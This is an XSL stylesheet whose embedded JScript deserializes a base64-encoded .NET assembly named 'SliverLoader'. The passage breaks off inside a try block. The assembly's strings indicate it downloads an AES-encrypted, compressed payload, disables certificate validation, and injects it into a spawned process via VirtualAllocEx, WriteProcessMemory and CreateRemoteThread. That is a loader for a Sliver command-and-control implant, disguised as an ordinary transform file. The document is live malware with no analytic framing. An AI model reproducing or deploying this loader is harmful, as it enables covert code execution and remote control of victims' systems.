<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
		<![CDATA[
		function setversion() {}
		function debug(s) {}
		function base64ToStream(b) {
			var enc = new ActiveXObject("System.Text.ASCIIEncoding");
			var length = enc.GetByteCount_2(b);
			var ba = enc.GetBytes_4(b);
			var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
			ba = transform.TransformFinalBlock(ba, 0, length);
			var ms = new ActiveXObject("System.IO.MemoryStream");
			ms.Write(ba, 0, (length / 4) * 3);
			ms.Position = 0;
			return ms;
		}

		var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
		"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
		"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
		"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
		"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
		"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
		"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
		"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
		"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAu"+
		"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
		"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
		"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
		"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
		"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
		"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
		"SG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVy"+
		"ZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAA"+
		"CQYAAAAJCQAAAAYRAAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0"+
		"W10pBhIAAAAsU3lzdGVtLk9iamVjdCBEeW5hbWljSW52b2tlKFN5c3RlbS5PYmplY3RbXSkIAAAA"+
		"CgELAAAAAgAAAAYTAAAAIFN5c3RlbS5YbWwuU2NoZW1hLlhtbFZhbHVlR2V0dGVyBhQAAABNU3lz"+
		"dGVtLlhtbCwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2Vu"+
		"PWI3N2E1YzU2MTkzNGUwODkGFQAAAAd0YXJnZXQwCQYAAAAGFwAAABpTeXN0ZW0uUmVmbGVjdGlv"+
		"bi5Bc3NlbWJseQYYAAAABExvYWQKDwwAAAAAJAAAAk1akAADAAAABAAAAP//AAC4AAAAAAAAAEAA"+
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMg"+
		"cHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAGSGAgCEChDv"+
		"AAAAAAAAAADwACIgCwIwAAAeAAAABAAAAAAAAAAAAAAAIAAAAAAAgAEAAAAAIAAAAAIAAAQAAAAA"+
		"AAAABgAAAAAAAAAAYAAAAAIAAAAAAAADAGCFAABAAAAAAAAAQAAAAAAAAAAAEAAAAAAAACAAAAAA"+
		"AAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAmAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
		"AGA7AAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
		"AAAAAAAAAAAAIAAASAAAAAAAAAAAAAAALnRleHQAAAAHHAAAACAAAAAeAAAAAgAAAAAAAAAAAAAA"+
		"AAAAIAAAYC5yc3JjAAAAmAMAAABAAAAABAAAACAAAAAAAAAAAAAAAAAAAEAAAEAAAAAAAAAAAAAA"+
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASAAAAAIABQAUJAAATBcAAAEAAAAAAAAAAAAA"+
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzAKABcBAAABAAAR"+
		"KBEAAAp+PgAABCUtFyZ+PQAABP4GEAAABnMSAAAKJYA+AAAEKBMAAAp0HwAAASgUAAAKcw0AAAYC"+
		"bxUAAAoKcxYAAAoLBSw0DgQsMB8QEwsrEAcGEQuRbxcAAAoRCxdYEwsRCwaOaRdZMecHbxgAAAoF"+
		"DgQoBwAABgwrAgYMCAQoBgAABg0DEwQJjmkTBXMLAAAGEwYRBhZ9NgAABHIBAABwEQQoGQAAChQU"+
		"FBcafhoAAAoUEQYSBygBAAAGJhEHewgAAAQlFnMbAAAKEQV+BAAABH4DAAAEKAIAAAYTCBYTCRIK"+
		"CY5pKBsAAAolEQgJEQoRCSgDAAAGJhZzGwAAChYRCBZzGwAAChYWcxsAAAooBAAABiYqABswAgC5"+
		"AAAAAgAAERQKA3IrAABwKBwAAAosR3MdAAAKCwJzHgAACgwIFnMfAAAKDQkHbyAAAAreFAksBglv"+
		"IQAACtwILAYIbyEAAArcB28iAAAKCt4KBywGB28hAAAK3AYqA3I9AABwKBwAAAosVHMdAAAKEwQC"+
		"cx4AAAoTBREFFnMjAAAKEwYRBhEEbyAAAAreGBEGLAcRBm8hAAAK3BEFLAcRBW8hAAAK3BEEbyIA"+
		"AAoK3gwRBCwHEQRvIQAACtwGKgIqAAAAAUwAAAIAJAAJLQAKAAAAAAIAHAAbNwAKAAAAAAIAFQA1"+
		"SgAKAAAAAAIAfAALhwAMAAAAAAIAcgAhkwAMAAAAAAIAagA/qQAMAAAAABswBACBAAAAAwAAEQMK"+
		"BAsoJAAACgwIBm8lAAAKCAdvJgAACggXbycAAAoICG8oAAAKCG8pAAAKbyoAAAoNAnMeAAAKEwQR"+
		"BAkXcysAAAoTBREFAhYCjmlvLAAAChEEbyIAAAoTBt4iEQUsBxEFbyEAAArcEQQsBxEEbyEAAArc"+
		"CCwGCG8hAAAK3BEGKgAAAAEoAAACAEUAF1wADAAAAAACADoALmgADAAAAAACAAoAanQACgAAAAAe"+
		"AigtAAAKKkofQIADAAAEIAAQAACABAAABCp6An4aAAAKfQYAAAQCKC0AAAoCAigBAAArfQUAAAQq"+
		"AAATMAIAYAAAAAAAAAACfhoAAAp9LAAABAJ+GgAACn0tAAAEAn4aAAAKfS4AAAQCfhoAAAp9OQAA"+
		"BAJ+GgAACn06AAAEAn4aAAAKfTsAAAQCfhoAAAp9PAAABAIoLQAACgICKAIAACt9KwAABCpOAgMo"+
		"LwAACiUggPD6Am8wAAAKKh4CKDEAAAoqLnMPAAAGgD0AAAQqHgIoLQAACioKFyoAQlNKQgEAAQAA"+
		"AAAADAAAAHY0LjAuMzAzMTkAAAAABQBsAAAA+AcAACN+AABkCAAAmAsAACNTdHJpbmdzAAAAAPwT"+
		"AABIAAAAI1VTAEQUAAAQAAAAI0dVSUQAAABUFAAA+AIAACNCbG9iAAAAAAAAAAIAAAFXHQIcCQoA"+
		"AAD6ATMAFgAAAQAAAC0AAAAIAAAAPgAAABAAAAAqAAAAMQAAAB4AAAAQAAAAAwAAAAEAAAABAAAA"+
		"BAAAAAEAAAACAAAABgAAAAIAAAAAADgHAQAAAAAABgCvBQkJBgAcBgkJBgDEBNMIDwApCQAABgDs"+
		"BB8IBgCDBR8IBgBkBR8IBgADBh8IBgDPBR8IBgDoBR8IBgADBR8IBgDYBOoIBgC2BOoIBgBHBR8I"+
		"BgAeBYMGBgBhCogHBgAnAGcDBgBzB2kBCgBNB/QHCgBoB/QHBgDmCCYLBgC3ByYLBgBbByYLBgBG"+
		"BIgHBgCgBYgHBgDIB4gHCgB9CnIKCgCgCnIKCgCrBogHBgCbBAkJCgCvBoILBgBpBEgJCgDkB0gJ"+
		"CgD3CYILCgBwCHIKBgCMBIgHBgCdBogHBgDMCIgHBgB5B2kBCgDrA/QHBgD7A4gHBgCPByYLBgDO"+
		"AyYLBgDaAyYLBgAjB+oIAAAAAEoAAAAAAAEAAQABABAAgAdVCEEAAQABAAoAEACdCQAAQQAFAAoA"+
		"CgEQAAwIAABhAAgACwACAQAAwAkAAGkADAALAAoAEAA6CAAAQQArAAsAAgAQALcKAABtAD0ADAAD"+
		"IRAAYwMAAEEAPQAOABEADwuUAREA4AKUAREA1gCXAREAgAKXAQYApAaaAQYApwhtAAYABwSdAQYA"+
		"FwptAAYAtwNtAAYAmAOaAQYAjQOaAQYGPQOXAVaAWgKgAVaAaAKgAVaAfACgAVaAMAKgAVaAwwCg"+
		"AVaAGgKgAVaAuAGgAVaA5AGgAVaAzAGgAVaAcwGgAVaAqAKgAVaAMwGgAVaAHQGgAVaAqAGgAVaA"+
		"FAKgAVaA+AGgAVaACQOgAVaAIQOgAVaAQQKgAVaAwwKgAVaASwGgAVaAjQCgAVaAYgCgAVaA/ACg"+
		"AVaAqQCgAVaA9AKgAVaAjAGgAVaA7QCgAVaAmQGgAVaAiwKgAQYAVwOaAQYAwwNtAAYASwhtAAYA"+
		"FgRtAAYABQOaAQYAOQOaAQYATQaaAQYAVQaaAQYA2wmaAQYA6QmaAQYANwWaAQYA0wmaAQYA7Aqk"+
		"AQYALgCkAQYAOgBtAAYAzAptAAYA1gptAAYAkAhtADYARgCnARYAAQCrAQAAAACAAJYgUwCvAQEA"+
		"AAAAAIAAliD4CsMBCwAAAAAAgACWIFALzAEQAAAAAACAAJEgpAPWARUASCAAAAAAlgA6BuEBHABs"+
		"IQAAAACWAE8K7AEhAIAiAAAAAJYAlQr0ASMAOCMAAAAAhhiaCAYAJgBAIwAAAACRGKAI/wEmAFMj"+
		"AAAAAIYYmggGACYAdCMAAAAAhhiaCAYAJgDgIwAAAADEAJ0K7gAmAPQjAAAAAIYYmggGACcA/CMA"+
		"AAAAkRigCP8BJwAIJAAAAACGGJoIBgAnABAkAAAAAIMACwADAicAAAABAB4EAAACADAEAAADAIkJ"+
		"AAAEAHYJAAAFADgJAAAGALAJAAAHAIcKAAAIAGMLAQAJADgIAgAKAAoIAAABABcKAAACAC4KAAAD"+
		"AGkGAAAEAFAEAAAFAGgKAAABABcKAAACACAKAAADAGkIAAAEAGkGAAAFAM0HAAABABcKAAACAHYJ"+
		"AAADAF0GAAAEADgKAAAFAIQIAAAGALAJAAAHAIIDAAABAEkHAAACAEMLAAADAKIHAAAEAA8LAAAF"+
		"AOACAAABAFIDAAACAKIHAAABAOEKAAACAA8LAAADAOACAAABAEcKAAABAGIIAAACAHkEAAADAO4H"+
		"AAAEAAcKCQCaCAEAEQCaCAYAGQCaCAoAKQCaCBAAMQCaCBAAOQCaCBAAQQCaCBAASQCaCBAAUQCa"+
		"CBAAWQCaCBAAYQCaCBUAaQCaCBAAcQCaCBAAeQCaCBAAyQCaCAYA8QCaCAYAGQHTBjIA+QCaCDcA"+
		"IQE+BD0AGQH7BkkA2QBFA08ADACaCAYADAC/A1sADAAHC2EAKQFaCmcAMQFGCG0AMQGaCAEAKQF2"+
		"C4EAkQCaCAYAkQCaCIcAmQCaCI0AOQExCJcASQFhBAYAkQAHC54AoQCaCI0AqQCFBLQAUQEeC4cA"+
		"UQHtAocAUQF3BrkAUQEWC54AUQHmAp4AUQG8CMAAuQCaCMkAOQGVBNUAgQCaCAYAaQFwBt0A2QCd"+
		"Cu4A4QCrCgEA2QCaCAYACQA0AP4ACQA4AAMBCQA8AAgBCQBAAA0BCQBEABIBCQBIABcBCQBMABwB"+
		"CQBQACEBCQBUACYBCQBYACsBCQBcADABCQBgADUBCQBkADoBCQBoAD8BCQBsAEQBCQBwAEkBCQB0"+
		"AE4BCQB4AFMBCQB8AFgBCQCAAF0BCQCEAGIBCQCIAGcBCQCMAGwBCQCQAHEBCQCUAHYBCQCYAHsB"+
		"CQCcAIABCQCgAIUBCQCkAIoBCQCoAI8BLgALABECLgATABoCLgAbADkCLgAjAEICLgArAFQCLgAz"+
		"AFQCLgA7AFQCLgBDAEICLgBLAFoCLgBTAFQCLgBbAFQCLgBjAHICLgBrAJwCLgBzAKkCowB7AP4A"+
		"AwGDAP4AGgBwAKMAKwdVAAABAwBTAAEAAAEFAPgKAQAAAQcAUAsBAAABCQCkAwEABIAAAAEAAAAA"+
		"AAAAAAAAAAAAVQgAAAQAAAAAAAAAAAAAAPUAWgMAAAAABAAAAAAAAAAAAAAA9QCIBwAAAAADAAIA"+
		"BAACAAUAAgAGAAIABwACAAgAAgBdAOQAXQDpAAAAADw+OV9fMTJfMAA8RG93bmxvYWRBbmRFeGVj"+
		"dXRlPmJfXzEyXzAATGlzdGAxAGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyADw+OQA8TW9kdWxlPgBD"+
		"cmVhdGVQcm9jZXNzQQBDUkVBVEVfQlJFQUtBV0FZX0ZST01fSk9CAENSRUFURV9TVVNQRU5ERUQA"+
		"UFJPQ0VTU19NT0RFX0JBQ0tHUk9VTkRfRU5EAENSRUFURV9ERUZBVUxUX0VSUk9SX01PREUAQ1JF"+
		"QVRFX05FV19DT05TT0xFAFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUAUFJPRklMRV9LRVJORUwAQ1JF"+
		"QVRFX1BSRVNFUlZFX0NPREVfQVVUSFpfTEVWRUwAQ1JFQVRFX1NIQVJFRF9XT1dfVkRNAENSRUFU"+
		"RV9TRVBBUkFURV9XT1dfVkRNAFBST0NFU1NfTU9ERV9CQUNLR1JPVU5EX0JFR0lOAFN5c3RlbS5J"+
		"TwBDUkVBVEVfTkVXX1BST0NFU1NfR1JPVVAAUFJPRklMRV9VU0VSAFBST0ZJTEVfU0VSVkVSAENS"+
		"RUFURV9GT1JDRURPUwBJRExFX1BSSU9SSVRZX0NMQVNTAFJFQUxUSU1FX1BSSU9SSVRZX0NMQVNT"+
		"AEhJR0hfUFJJT1JJVFlfQ0xBU1MAQUJPVkVfTk9STUFMX1BSSU9SSVRZX0NMQVNTAEJFTE9XX05P"+
		"Uk1BTF9QUklPUklUWV9DTEFTUwBERVRBQ0hFRF9QUk9DRVNTAENSRUFURV9QUk9URUNURURfUFJP"+
		"Q0VTUwBERUJVR19QUk9DRVNTAERFQlVHX09OTFlfVEhJU19QUk9DRVNTAE1FTV9DT01NSVQAQ1JF"+
		"QVRFX0lHTk9SRV9TWVNURU1fREVGQVVMVABDUkVBVEVfVU5JQ09ERV9FTlZJUk9OTUVOVABFWFRF"+
		"TkRFRF9TVEFSVFVQSU5GT19QUkVTRU5UAEFFU0lWAGdldF9JVgBzZXRfSVYAQ1JFQVRFX05PX1dJ"+
		"TkRPVwBkd1gASU5IRVJJVF9QQVJFTlRfQUZGSU5JVFkASU5IRVJJVF9DQUxMRVJfUFJJT1JJVFkA"+
		"ZHdZAHZhbHVlX18ARG93bmxvYWREYXRhAGRhdGEAY2IAbXNjb3JsaWIAPD5jAFN5c3RlbS5Db2xs"+
		"ZWN0aW9ucy5HZW5lcmljAGxwVGhyZWFkSWQAZHdUaHJlYWRJZABkd1Byb2Nlc3NJZABDcmVhdGVS"+
		"ZW1vdGVUaHJlYWQAaFRocmVhZABBZGQAbHBSZXNlcnZlZABQYWRkaW5nTW9kZQBDcnlwdG9TdHJl"+
		"YW1Nb2RlAENvbXByZXNzaW9uTW9kZQBJRGlzcG9zYWJsZQBiSW5oZXJpdEhhbmRsZQBscFRpdGxl"+
		"AGxwQXBwbGljYXRpb25OYW1lAGxwQ29tbWFuZExpbmUAQ29tYmluZQBWYWx1ZVR5cGUAZmxBbGxv"+
		"Y2F0aW9uVHlwZQBEaXNwb3NlAFg1MDlDZXJ0aWZpY2F0ZQBjZXJ0aWZpY2F0ZQBDcmVhdGUARGVs"+
		"ZWdhdGUAV3JpdGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBEZWJ1"+
		"Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0"+
		"ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAZHdG"+
		"aWxsQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1"+
		"cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUARmxhZ3NBdHRyaWJ1"+
		"dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1"+
		"dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1"+
		"bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAERvd25sb2FkQW5kRXhlY3V0ZQBkd1hTaXplAGR3"+
		"WVNpemUAZHdTdGFja1NpemUAZHdTaXplAFNpemVPZgBzZXRfUGFkZGluZwBTeXN0ZW0uUnVudGlt"+
		"ZS5WZXJzaW9uaW5nAFN0cmluZwBMZW5ndGgAVXJpAFJlbW90ZUNlcnRpZmljYXRlVmFsaWRhdGlv"+
		"bkNhbGxiYWNrAGdldF9TZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjawBzZXRfU2Vy"+
		"dmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sATWFyc2hhbABrZXJuZWwzMi5kbGwAU2xp"+
		"dmVyTG9hZGVyLmRsbAB1cmwARGVmbGF0ZVN0cmVhbQBDcnlwdG9TdHJlYW0AR1ppcFN0cmVhbQBN"+
		"ZW1vcnlTdHJlYW0AUHJvZ3JhbQBTeXN0ZW0AU3ltbWV0cmljQWxnb3JpdGhtAENvbXByZXNzaW9u"+
		"QWxnb3JpdGhtAElDcnlwdG9UcmFuc2Zvcm0ARW51bQBscE51bWJlck9mQnl0ZXNXcml0dGVuAFg1"+
		"MDlDaGFpbgBjaGFpbgBTeXN0ZW0uSU8uQ29tcHJlc3Npb24AbHBQcm9jZXNzSW5mb3JtYXRpb24A"+
		"U3lzdGVtLlJlZmxlY3Rpb24AQ29weVRvAGxwU3RhcnR1cEluZm8AWmVybwBscERlc2t0b3AAU2xp"+
		"dmVyTG9hZGVyAHNlbmRlcgBidWZmZXIAU2VydmljZVBvaW50TWFuYWdlcgBscFBhcmFtZXRlcgBo"+
		"U3RkRXJyb3IALmN0b3IALmNjdG9yAGxwU2VjdXJpdHlEZXNjcmlwdG9yAENyZWF0ZURlY3J5cHRv"+
		"cgBJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAEFlcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2Vy"+
		"dmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBiSW5o"+
		"ZXJpdEhhbmRsZXMAU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5YNTA5Q2VydGlmaWNhdGVz"+
		"AGxwVGhyZWFkQXR0cmlidXRlcwBscFByb2Nlc3NBdHRyaWJ1dGVzAFNlY3VyaXR5QXR0cmlidXRl"+
		"cwBkd0NyZWF0aW9uRmxhZ3MAQ3JlYXRlUHJvY2Vzc0ZsYWdzAGR3RmxhZ3MAZHdYQ291bnRDaGFy"+
		"cwBkd1lDb3VudENoYXJzAFNzbFBvbGljeUVycm9ycwBzc2xQb2xpY3lFcnJvcnMAaFByb2Nlc3MA"+
		"bHBCYXNlQWRkcmVzcwBscEFkZHJlc3MAbHBTdGFydEFkZHJlc3MAYWRkcmVzcwBEZWNvbXByZXNz"+
		"AENvbmNhdABPYmplY3QAZmxQcm90ZWN0AFN5c3RlbS5OZXQAV2ViQ2xpZW50AGxwRW52aXJvbm1l"+
		"bnQARGVjcnlwdABHZXRXZWJSZXF1ZXN0AHNldF9UaW1lb3V0AFdlYkNsaWVudFdpdGhUaW1lb3V0"+
		"AGhTdGRJbnB1dABoU3RkT3V0cHV0AGNpcGhlcnRleHQAd1Nob3dXaW5kb3cAVmlydHVhbEFsbG9j"+
		"RXgAVG9BcnJheQBBRVNLZXkAZ2V0X0tleQBzZXRfS2V5AFN5c3RlbS5TZWN1cml0eS5DcnlwdG9n"+
		"cmFwaHkAVGFyZ2V0QmluYXJ5AFdyaXRlUHJvY2Vzc01lbW9yeQBscEN1cnJlbnREaXJlY3RvcnkA"+
		"b3BfRXF1YWxpdHkAU3lzdGVtLk5ldC5TZWN1cml0eQAAAAApQwA6AFwAVwBpAG4AZABvAHcAcwBc"+
		"AFMAeQBzAHQAZQBtADMAMgBcAAARZABlAGYAbABhAHQAZQA5AAAJZwB6AGkAcAAAAD+qgQqYbQdF"+
		"jNmqZSjFWtAABCABAQgDIAABBSABARERBCABAQ4EIAEBAhcHDB0FFRJFAQUdBR0FDggSGBEQGAgY"+
		"CAQAABJ9BSACARwYCwACEoCREoCREoCRBQABARJ9BSABHQUOBRUSRQEFBSABARMABSAAHRMABQAC"+
		"Dg4OAgYYEAcHHQUSSRJJEk0SSRJJElEFAAICDg4FIAEBHQUJIAIBEoCdEYChBiABARKAnQQgAB0F"+
		"EAcHHQUdBRJVElkSSRJdHQUEAAASVQYgAQERgK0IIAISWR0FHQULIAMBEoCdElkRgLEHIAMBHQUI"+
		"CAYQAQEIHgAECgESDAQKARIYBiABEnESdQi3elxWGTTgiQQBAAAABAIAAAAEBAAAAAQIAAAABBAA"+
		"AAAEIAAAAARAAAAABIAAAAAEAAEAAAQAAgAABAAEAAAEAAgAAAQAEAAABAAgAAAEAEAAAAQAgAAA"+
		"BAAAAQAEAAACAAQAAAQABAAACAAEAAAQAAQAACAABAAAAAEEAAAAAgQAAAAEBAAAAAgEAAAAEAQA"+
		"AAAgBAAAAEAEAAAAgAIGDgIGCQIGCAIGAgMGERQCBgYDBhIgAwYSfRMAChgODhIMEgwCERQYDhIY"+
		"EBEQCAAFGBgYCAkJCQAFAhgYHQUYCAoABxgYGAkYGAkYCgAFAQ4ODh0FHQUHAAIdBR0FDgoAAx0F"+
		"HQUdBR0FAwAAAQ0gBAIcEoCBEoCFEYCJCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9u"+
		"VGhyb3dzAQgBAAIAAAAAABEBAAxTbGl2ZXJMb2FkZXIAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkg"+
		"IDIwMjQAACkBACRhNmIwZTA3OS1hN2JlLTQ4OGMtYTk4MC0yOTdlMmM3MmVkYTcAAAwBAAcxLjAu"+
		"MC4wAABNAQAcLk5FVEZyYW1ld29yayxWZXJzaW9uPXY0LjcuMgEAVA4URnJhbWV3b3JrRGlzcGxh"+
		"eU5hbWUULk5FVCBGcmFtZXdvcmsgNC43LjIAAAAAALon6qIAAAAAAgAAAG8AAACYOwAAmB0AAAAA"+
		"AAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RTwO5BeSHxJEWfqEF4MkvUhQEAAABDOlxVc2Vy"+
		"c1xsb2NrbFxzb3VyY2VccmVwb3NcU2xpdmVyTG9hZGVyXFNsaXZlckxvYWRlclxvYmpceDY0XFJl"+
		"bGVhc2VcU2xpdmVyTG9hZGVyLnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEA"+
		"AAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAADwDAAAAAAAAAAAAADwDNAAAAFYAUwBf"+
		"AFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAA"+
		"AAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAk"+
		"AAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAScAgAAAQBTAHQAcgBpAG4AZwBGAGkA"+
		"bABlAEkAbgBmAG8AAAB4AgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUAbgB0"+
		"AHMAAAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAAQgANAAEARgBpAGwA"+
		"ZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAFMAbABpAHYAZQByAEwAbwBhAGQAZQByAAAAAAAw"+
		"AAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAABCABEAAQBJAG4A"+
		"dABlAHIAbgBhAGwATgBhAG0AZQAAAFMAbABpAHYAZQByAEwAbwBhAGQAZQByAC4AZABsAGwAAAAA"+
		"AEgAEgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAA"+
		"qQAgACAAMgAwADIANAAAACoAAQABAEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAA"+
		"AAAASgARAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAFMAbABpAHYAZQByAEwA"+
		"bwBhAGQAZQByAC4AZABsAGwAAAAAADoADQABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAUwBs"+
		"AGkAdgBlAHIATABvAGEAZABlAHIAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8A"+
		"bgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBu"+
		"AAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
		"AAAAAAAAAAAAAAAAAAENAAAABAAAAAkYAAAACQYAAAAJFwAAAAYbAAAAJ1N5c3RlbS5SZWZsZWN0"+
		"aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQYcAAAALlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5"+
		"IExvYWQoU3lzdGVtLkJ5dGVbXSkIAAAACgsA";
		var entry_class = 'SliverLoader.Program';

		try {
			setversion();
